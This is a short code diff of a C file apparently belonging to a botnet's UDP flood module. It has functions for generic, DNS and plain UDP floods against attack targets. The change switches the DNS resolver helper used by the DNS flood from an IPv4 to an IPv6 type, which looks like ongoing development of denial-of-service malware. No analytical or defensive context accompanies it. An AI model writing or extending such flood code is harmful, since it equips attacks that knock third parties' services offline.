@@ -20,7 +20,7 @@
 #include "table.h"
 #include "protocol.h"
 
-static ipv4_t get_dns_resolver(void);
+static ipv6_t get_dns_resolver(void);
 
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -241,7 +241,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
     int domain_len;
-    ipv4_t dns_resolver = get_dns_resolver();
+    ipv6_t dns_resolver = get_dns_resolver();
 
     if (domain == NULL)
     {
@@ -476,7 +476,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     }
 }
 
-static ipv4_t get_dns_resolver(void)
+static ipv6_t get_dns_resolver(void)
 {
     int fd;
 
